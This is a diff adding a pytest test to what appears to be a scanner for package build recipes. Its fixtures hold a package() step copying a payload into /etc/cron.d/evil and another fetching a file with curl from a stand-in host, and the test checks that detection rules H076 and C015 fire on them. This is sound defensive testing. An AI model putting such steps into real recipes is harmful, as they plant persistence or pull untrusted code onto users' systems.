@@ -69,3 +69,19 @@ def test_write_outside_staging_in_package_is_h076():
         "package() {\n  cp payload /etc/cron.d/evil\n}\n"
     ))
     assert "H076" in ids
+
+
+def test_c015_fires_on_the_whole_recipe_path():
+    """Spec §7: the --full-recipe path must behave identically.  There the
+    whole recipe is the document; C015 still reads package() and fires."""
+    from trustsight.analysis.structural import _structural_findings
+    from trustsight.schema import SourceChanges
+
+    diff = _diff(
+        "package() {\n"
+        "  curl -o \"$pkgdir/out\" https://example.invalid/x\n"
+        "}\n"
+    )
+    findings = _structural_findings(
+        diff, SourceChanges(), {}, whole_recipe=True)
+    assert any(f["rule_id"] == "C015" for f in findings)
